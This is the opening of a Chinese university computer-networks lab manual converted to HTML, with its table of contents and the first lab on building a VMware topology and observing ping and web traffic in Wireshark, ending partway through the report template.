<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-cn" lang="zh-cn"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>1.	标题：基本网络工具集使用和协议数据单元（PDU）观测</title><meta name="author" content="z"/><style type="text/css"> * {margin:0; padding:0; text-indent:0; }
 .s1 { color: black; font-family:黑体, monospace; font-style: normal; font-weight: normal; text-decoration: none; font-size: 40pt; }
 .s2 { color: black; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 20pt; }
 .s3 { color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 20pt; }
 .s4 { color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 9pt; }
 .s5 { color: black; font-family:华文新魏; font-style: normal; font-weight: normal; text-decoration: none; font-size: 14pt; }
 .s6 { color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt; }
 .s7 { color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 12pt; }
 .s8 { color: black; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 12pt; }
 .s9 { color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 22pt; }
 .a { color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt; }
 .s10 { color: black; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt; }
 .s11 { color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt; }
 h2 { color: black; font-family:宋体; font-style: normal; font-weight: bold; text-decoration: none; font-size: 16pt; }
 .s12 { color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 16pt; }
 .h3, h3 { color: black; font-family:宋体; font-style: normal; font-weight: bold; text-decoration: none; font-size: 14pt; }
 .s13 { color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 .s14 { color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 .s15 { color: #F00; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 .s16 { color: #F00; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 .s17 { color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 .s18 { color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 .s19 { color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 .s20 { color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8pt; }
 .s21 { color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 8pt; }
 .s22 { color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 12pt; }
 .s23 { color: black; font-family:宋体; font-style: normal; font-weight: bold; text-decoration: none; font-size: 12pt; }
 .s24 { color: black; font-family:"Times New Roman", serif; font-style: italic; font-weight: bold; text-decoration: none; font-size: 10.5pt; }
 .s25 { color: black; font-family:宋体; font-style: normal; font-weight: bold; text-decoration: none; font-size: 10.5pt; }
 .s26 { color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 14pt; }
 .s27 { color: black; font-family:"Times New Roman", serif; font-style: italic; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 .s28 { color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10pt; }
 .s29 { color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 10.5pt; }
 .s30 { color: #F00; font-family:"Times New Roman", serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 10.5pt; }
 .s31 { color: #F00; font-family:宋体; font-style: normal; font-weight: bold; text-decoration: none; font-size: 10.5pt; }
 .s32 { color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt; }
 .s33 { color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt; }
 .s34 { color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt; }
 .s35 { color: #F00; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt; }
 .s36 { color: #F00; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt; }
 .s38 { color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 11pt; }
 .s39 { color: black; font-family:Consolas, monospace; font-style: normal; font-weight: normal; text-decoration: none; font-size: 12pt; }
 .s40 { color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 12pt; }
 .s41 { color: black; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 .s42 { color: black; font-family:Calibri, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 10.5pt; }
 .s43 { color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 14pt; }
 .s44 { color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 14pt; }
 .s45 { color: #00AF50; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 12pt; }
 .s46 { color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 14pt; vertical-align: 6pt; }
 .s48 { color: black; font-family:宋体; font-style: normal; font-weight: bold; text-decoration: none; font-size: 22pt; }
 .h1 { color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 22pt; }
 .s49 { color: black; font-family:Calibri, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 14pt; }
 .s50 { color: black; font-family:宋体; font-style: normal; font-weight: bold; text-decoration: none; font-size: 12pt; }
 .s51 { color: black; font-family:宋体; font-style: normal; font-weight: bold; text-decoration: none; font-size: 11pt; }
 .s52 { color: black; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt; }
 .s53 { color: #00F; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: underline; font-size: 11pt; }
 .s55 { color: #00F; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: underline; font-size: 11pt; }
 .s56 { color: #00F; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: underline; font-size: 11pt; }
 .s58 { color: black; font-family:Calibri, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 11pt; }
 .s59 { color: black; font-family:Cambria, serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 12pt; }
 .s60 { color: black; font-family:Calibri, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt; }
 .s61 { color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10pt; }
 h4 { color: black; font-family:Arial, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 12.5pt; }
 .p, p { color: black; font-family:Verdana, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 9.5pt; margin:0pt; }
 .s62 { color: #0000ED; font-family:Verdana, sans-serif; font-style: normal; font-weight: normal; text-decoration: underline; font-size: 9.5pt; }
 .s63 { color: #0000ED; font-family:Verdana, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 9.5pt; }
 .s64 { color: #0000ED; font-family:Verdana, sans-serif; font-style: normal; font-weight: normal; text-decoration: underline; font-size: 9.5pt; }
 .s66 { color: black; font-family:Verdana, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 9.5pt; }
 .s67 { color: black; font-family:Arial, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 11.5pt; }
 .s68 { color: black; font-family:"Courier New", monospace; font-style: normal; font-weight: normal; text-decoration: none; font-size: 9.5pt; }
 .s69 { color: black; font-family:Verdana, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 9.5pt; }
 li {display: block; }
 #l1 {padding-left: 0pt;counter-reset: c1 1; }
 #l1> li:before {counter-increment: c1; content: counter(c1, decimal)". "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 #l1> li:first-child:before {counter-increment: c1 0;  }
 li {display: block; }
 #l2 {padding-left: 0pt;counter-reset: d1 1; }
 #l2> li:before {counter-increment: d1; content: "（"counter(d1, decimal)"） "; color: black; font-family:宋体; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 #l2> li:first-child:before {counter-increment: d1 0;  }
 li {display: block; }
 #l3 {padding-left: 0pt;counter-reset: e1 1; }
 #l3> li:before {counter-increment: e1; content: counter(e1, decimal)" "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 12pt; }
 #l3> li:first-child:before {counter-increment: e1 0;  }
 li {display: block; }
 #l4 {padding-left: 0pt;counter-reset: f1 1; }
 #l4> li:before {counter-increment: f1; content: counter(f1, decimal)" "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 12pt; }
 #l4> li:first-child:before {counter-increment: f1 0;  }
 #l5 {padding-left: 0pt;counter-reset: f2 1; }
 #l5> li:before {counter-increment: f2; content: counter(f1, decimal)"."counter(f2, decimal)" "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 #l5> li:first-child:before {counter-increment: f2 0;  }
 li {display: block; }
 #l6 {padding-left: 0pt;counter-reset: g1 2; }
 #l6> li:before {counter-increment: g1; content: counter(g1, lower-latin)". "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 #l6> li:first-child:before {counter-increment: g1 0;  }
 li {display: block; }
 #l7 {padding-left: 0pt;counter-reset: h1 2; }
 #l7> li:before {counter-increment: h1; content: counter(h1, lower-latin)". "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 #l7> li:first-child:before {counter-increment: h1 0;  }
 li {display: block; }
 #l8 {padding-left: 0pt;counter-reset: i1 2; }
 #l8> li:before {counter-increment: i1; content: counter(i1, decimal)". "; color: #F00; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 #l8> li:first-child:before {counter-increment: i1 0;  }
 li {display: block; }
 #l9 {padding-left: 0pt;counter-reset: j1 1; }
 #l9> li:before {counter-increment: j1; content: counter(j1, decimal)". "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 #l9> li:first-child:before {counter-increment: j1 0;  }
 li {display: block; }
 #l10 {padding-left: 0pt;counter-reset: k1 1; }
 #l10> li:before {counter-increment: k1; content: counter(k1, decimal)". "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt; }
 #l10> li:first-child:before {counter-increment: k1 0;  }
 #l11 {padding-left: 0pt;counter-reset: k2 1; }
 #l11> li:before {counter-increment: k2; content: counter(k2, decimal)". "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt; }
 #l11> li:first-child:before {counter-increment: k2 0;  }
 #l12 {padding-left: 0pt;counter-reset: k3 1; }
 #l12> li:before {counter-increment: k3; content: counter(k2, decimal)"."counter(k3, decimal)" "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt; }
 #l12> li:first-child:before {counter-increment: k3 0;  }
 li {display: block; }
 #l13 {padding-left: 0pt;counter-reset: l1 1; }
 #l13> li:before {counter-increment: l1; content: counter(l1, decimal)" "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 12pt; }
 #l13> li:first-child:before {counter-increment: l1 0;  }
 li {display: block; }
 #l14 {padding-left: 0pt;counter-reset: m1 1; }
 #l14> li:before {counter-increment: m1; content: "["counter(m1, decimal)"] "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt; }
 #l14> li:first-child:before {counter-increment: m1 0;  }
 li {display: block; }
 #l15 {padding-left: 0pt;counter-reset: n1 1; }
 #l15> li:before {counter-increment: n1; content: counter(n1, decimal)" "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 12pt; }
 #l15> li:first-child:before {counter-increment: n1 0;  }
 #l16 {padding-left: 0pt; }
 #l16> li:before {content: " "; color: black; font-family:Symbol, serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 li {display: block; }
 #l17 {padding-left: 0pt;counter-reset: o1 1; }
 #l17> li:before {counter-increment: o1; content: counter(o1, decimal)". "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 #l17> li:first-child:before {counter-increment: o1 0;  }
 li {display: block; }
 #l18 {padding-left: 0pt;counter-reset: p1 1; }
 #l18> li:before {counter-increment: p1; content: counter(p1, decimal)" "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 12pt; }
 #l18> li:first-child:before {counter-increment: p1 0;  }
 li {display: block; }
 #l19 {padding-left: 0pt;counter-reset: q1 1; }
 #l19> li:before {counter-increment: q1; content: counter(q1, decimal)" "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 12pt; }
 #l19> li:first-child:before {counter-increment: q1 0;  }
 #l20 {padding-left: 0pt;counter-reset: q2 1; }
 #l20> li:before {counter-increment: q2; content: counter(q1, decimal)"."counter(q2, decimal)" "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 #l20> li:first-child:before {counter-increment: q2 0;  }
 li {display: block; }
 #l21 {padding-left: 0pt;counter-reset: r1 1; }
 #l21> li:before {counter-increment: r1; content: counter(r1, decimal)". "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 #l21> li:first-child:before {counter-increment: r1 0;  }
 li {display: block; }
 #l22 {padding-left: 0pt;counter-reset: s1 1; }
 #l22> li:before {counter-increment: s1; content: counter(s1, decimal)". "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt; }
 #l22> li:first-child:before {counter-increment: s1 0;  }
 #l23 {padding-left: 0pt;counter-reset: s2 1; }
 #l23> li:before {counter-increment: s2; content: counter(s2, decimal)". "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt; }
 #l23> li:first-child:before {counter-increment: s2 0;  }
 li {display: block; }
 #l24 {padding-left: 0pt;counter-reset: t1 4; }
 #l24> li:before {counter-increment: t1; content: counter(t1, decimal)" "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt; }
 #l24> li:first-child:before {counter-increment: t1 0;  }
 #l25 {padding-left: 0pt;counter-reset: t2 1; }
 #l25> li:before {counter-increment: t2; content: counter(t1, decimal)"."counter(t2, decimal)" "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt; }
 #l25> li:first-child:before {counter-increment: t2 0;  }
 li {display: block; }
 #l26 {padding-left: 0pt;counter-reset: u1 1; }
 #l26> li:before {counter-increment: u1; content: counter(u1, decimal)" "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 12pt; }
 #l26> li:first-child:before {counter-increment: u1 0;  }
 #l27 {padding-left: 0pt;counter-reset: u2 1; }
 #l27> li:before {counter-increment: u2; content: counter(u1, decimal)"."counter(u2, decimal)" "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 #l27> li:first-child:before {counter-increment: u2 0;  }
 li {display: block; }
 #l28 {padding-left: 0pt;counter-reset: v1 1; }
 #l28> li:before {counter-increment: v1; content: counter(v1, decimal)" "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 12pt; }
 #l28> li:first-child:before {counter-increment: v1 0;  }
 #l29 {padding-left: 0pt;counter-reset: v2 1; }
 #l29> li:before {counter-increment: v2; content: counter(v1, decimal)"."counter(v2, decimal)" "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 #l29> li:first-child:before {counter-increment: v2 0;  }
 #l30 {padding-left: 0pt;counter-reset: v3 1; }
 #l30> li:before {counter-increment: v3; content: counter(v1, decimal)"."counter(v2, decimal)"."counter(v3, decimal)" "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 #l30> li:first-child:before {counter-increment: v3 0;  }
 #l31 {padding-left: 0pt;counter-reset: w1 1; }
 #l31> li:before {counter-increment: w1; content: counter(w1, decimal)") "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 9.5pt; }
 #l31> li:first-child:before {counter-increment: w1 0;  }
 #l32 {padding-left: 0pt;counter-reset: v2 1; }
 #l32> li:before {counter-increment: v2; content: counter(v1, decimal)"."counter(v2, decimal)" "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 #l32> li:first-child:before {counter-increment: v2 0;  }
 #l33 {padding-left: 0pt;counter-reset: v3 1; }
 #l33> li:before {counter-increment: v3; content: counter(v1, decimal)"."counter(v2, decimal)"."counter(v3, decimal)" "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 #l33> li:first-child:before {counter-increment: v3 0;  }
 #l34 {padding-left: 0pt;counter-reset: v2 1; }
 #l34> li:before {counter-increment: v2; content: counter(v1, decimal)"."counter(v2, decimal)" "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 #l34> li:first-child:before {counter-increment: v2 0;  }
 #l35 {padding-left: 0pt;counter-reset: v3 1; }
 #l35> li:before {counter-increment: v3; content: counter(v1, decimal)"."counter(v2, decimal)"."counter(v3, decimal)" "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 #l35> li:first-child:before {counter-increment: v3 0;  }
 #l36 {padding-left: 0pt;counter-reset: v2 1; }
 #l36> li:before {counter-increment: v2; content: counter(v1, decimal)"."counter(v2, decimal)" "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 #l36> li:first-child:before {counter-increment: v2 0;  }
 #l37 {padding-left: 0pt;counter-reset: v3 1; }
 #l37> li:before {counter-increment: v3; content: counter(v1, decimal)"."counter(v2, decimal)"."counter(v3, decimal)" "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 #l37> li:first-child:before {counter-increment: v3 0;  }
 li {display: block; }
 #l38 {padding-left: 0pt;counter-reset: x1 1; }
 #l38> li:before {counter-increment: x1; content: counter(x1, decimal)". "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt; }
 #l38> li:first-child:before {counter-increment: x1 0;  }
 #l39 {padding-left: 0pt;counter-reset: x2 1; }
 #l39> li:before {counter-increment: x2; content: counter(x2, decimal)". "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt; }
 #l39> li:first-child:before {counter-increment: x2 0;  }
 #l40 {padding-left: 0pt;counter-reset: x3 1; }
 #l40> li:before {counter-increment: x3; content: counter(x2, decimal)"."counter(x3, decimal)" "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 11pt; }
 #l40> li:first-child:before {counter-increment: x3 0;  }
 li {display: block; }
 #l41 {padding-left: 0pt;counter-reset: y1 1; }
 #l41> li:before {counter-increment: y1; content: counter(y1, decimal)". "; color: black; font-family:"Times New Roman", serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 10.5pt; }
 #l41> li:first-child:before {counter-increment: y1 0;  }
 #l42 {padding-left: 0pt;counter-reset: y2 1; }
 #l42> li:before {counter-increment: y2; content: counter(y2, decimal)". "; color: black; font-family:Verdana, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 9.5pt; }
 #l42> li:first-child:before {counter-increment: y2 0;  }
 li {display: block; }
 #l43 {padding-left: 0pt;counter-reset: z1 1; }
 #l43> li:before {counter-increment: z1; content: counter(z1, upper-roman)". "; color: black; font-family:Arial, sans-serif; font-style: normal; font-weight: bold; text-decoration: none; font-size: 11.5pt; }
 #l43> li:first-child:before {counter-increment: z1 0;  }
</style></head><body>

<span>![image](计算机网络实验教材2.03(修订)/Image_001.png)</span>

《计算机网络》

实验教材

[<span class="s3">第 </span>2.03 <span class="s3">版</span>]

0

<p class="s5" style="padding-top: 2pt;text-indent: 0pt;text-align: right;">庄元 许鼎鼎 <span class="s6">编写</span>

夏耐 顾庆 李文中 <span class="s6">汇总</span>

南京大学计算机科学与技术系 <span class="s8">2017 </span>年 <span class="s8">2 </span>月

目录

[实验一 基本网络工具集使用和协议数据单元（](#bookmark0)[PDU](#bookmark0)[）观测 ](#bookmark0)[3](#bookmark0)

[实 验 任 务 ](#bookmark1)[3](#bookmark1)

[实 验 报 告 格 式 ](#bookmark2)[3](#bookmark2)

[背 景 知 识 ](#bookmark3)[3](#bookmark3)

[实 验 方 法 ](#bookmark4)[6](#bookmark4)

[部 署 ， 操 作 ](#bookmark5)[/ ](#bookmark5)[设 计 步 骤 （ 虚 拟 机 器 的 配 置 ） ](#bookmark5)[6](#bookmark5)

[常 见 问 题 ](#bookmark6)[14](#bookmark6)

[实 验 二 ](#bookmark7)[RAW SOCKET ](#bookmark7)[编 程 与 以 太 网 帧 分 析 基 础 ](#bookmark7)[16](#bookmark7)

[实 验 任 务 ](#bookmark8)[16](#bookmark8)

[实 验 报 告 ](#bookmark9)[16](#bookmark9)

[背 景 知 识 ](#bookmark10)[18](#bookmark10)

[实 验 目 标 ](#bookmark11)[21](#bookmark11)

[部署，操作](#bookmark12)[/](#bookmark12)[设计步骤 （虚拟机器的配置和拓扑） ](#bookmark12)[21](#bookmark12)

[补 充 内 容 ](#bookmark13)[24](#bookmark13)

[实 验 三 子 网 划 分 和 ](#bookmark14)[NAT ](#bookmark14)[配 置 ](#bookmark14)[25](#bookmark14)

[实 验 任 务 ](#bookmark15)[25](#bookmark15)

[实 验 报 告 ](#bookmark16)[25](#bookmark16)

[背 景 知 识 ](#bookmark17)[26](#bookmark17)

[实 验 目 标 ](#bookmark18)[29](#bookmark18)

[部署，操作](#bookmark19)[/](#bookmark19)[设计步骤（虚拟机器的配置和拓扑） ](#bookmark19)[29](#bookmark19)

[注 意 事 项 ](#bookmark20)[30](#bookmark20)

[实 验 四 静 态 路 由 编 程 实 现 ](#bookmark21)[31](#bookmark21)

[实 验 任 务 ](#bookmark22)[31](#bookmark22)

[实 验 报 告 ](#bookmark23)[31](#bookmark23)

[背 景 知 识 ](#bookmark24)[33](#bookmark24)

[实 验 目 标 ](#bookmark25)[34](#bookmark25)

[部 署 ， 操 作 ](#bookmark26)[/ ](#bookmark26)[设 计 步 骤 ](#bookmark26)[34](#bookmark26)

[实 验 五 动 态 路 由 协 议 ](#bookmark27)[RIP](#bookmark27)[，](#bookmark27)[OSPF ](#bookmark27)[和 ](#bookmark27)[BGP ](#bookmark27)[观 察 ](#bookmark27)[36](#bookmark27)

[背 景 知 识 ](#bookmark28)[36](#bookmark28)

[实 验 目 标 ](#bookmark29)[37](#bookmark29)

[实 验 任 务 ](#bookmark30)[37](#bookmark30)

[实 验 报 告 ](#bookmark31)[42](#bookmark31)

[实 验 六 ](#bookmark32)[VPN ](#bookmark32)[设 计 、 实 现 与 分 析 ](#bookmark32)[44](#bookmark32)

[背 景 知 识 ](#bookmark33)[44](#bookmark33)

[实 验 目 标 ](#bookmark34)[44](#bookmark34)

[实 验 任 务 ](#bookmark35)[44](#bookmark35)

[实 验 报 告 ](#bookmark36)[49](#bookmark36)

[实 验 七 ](#bookmark37)[TCP ](#bookmark37)[协 议 的 拥 塞 控 制 机 制 观 察 ](#bookmark37)[51](#bookmark37)

[实 验 任 务 ](#bookmark38)[51](#bookmark38)

[附 录 ](#bookmark39)[1. Linux ](#bookmark39)[命 令 列 表 ](#bookmark39)[52](#bookmark39)

[附 录 ](#bookmark40)[2. raw_socket 52](#bookmark40)

## <a name="bookmark0">实验一 基本网络工具集使用和协议数据单元（</a><span class="s12">PDU</span>）观测

### <a name="bookmark1">实验任务</a>

1.  利用<span class="s14">VMWare </span>搭建一个由 <span class="s15">5 </span><span style=" color: #F00;">台虚拟机</span>组成的随机拓扑网络。要求该网络中至少有 <span class="s15">3 </span>个子网（暂时可假设<span class="s14">internet </span>为一个子网），两个路由器，<span style=" color: #F00;">本章末尾给出实验参考拓扑</span>。

2.  利用 <span class="s14">Wireshark </span>观测<span class="s14">PDU</span>：

1.  安装并打开 <span class="s14">Wireshark</span>，确保本机能否正常上网。

2.  在本机 <span class="s14">ping </span>系主页 <span class="s14">cs.nju.edu.cn</span>，用 <span class="s14">Wireshark </span>记录本机和<span class="s14">cs.nju.edu.cn </span>相互通信的所有数据包，截图，简要分析数据包的各字段。

3.  [在本机打开浏览器，访问 ](http://www.nju.edu.cn/)www.nju.edu.cn<span class="s13">，用 </span>Wireshark [记录本机和 ](http://www.nju.edu.cn/)[www.nju.edu.cn](http://www.nju.edu.cn/)

相互通信的所有数据包，截图，简要分析数据包的各字段。

### <a name="bookmark2">实验报告格式</a>

按要求完成实验，并写出实验报告。实验报告格式如下，同学可以根据内容进行修改。说明是为了更详细的解释各个项目，提交的报告中无需包含。
<table style="border-collapse:collapse;margin-left:7.154pt" cellspacing="0"><tr style="height:18pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

实验目的
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:18pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

网络拓扑配置
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：填写附表 <span class="s19">1</span>，并绘图说明
</td></tr><tr style="height:17pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

路由规则配置
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：写明输入的命令
</td></tr><tr style="height:38pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

数据包截图
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：用 <span class="s19">wireshark </span>抓包，并截图
</td></tr><tr style="height:21pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

协议报文分析
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：对抓取的数据包进行字段分析
</td></tr></table>

附表 <span class="s14">1</span>：
<table style="border-collapse:collapse;margin-left:22.27pt" cellspacing="0"><tr style="height:16pt"><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

节点名
</td><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

虚拟设备名
</td><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

ip
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

netmask
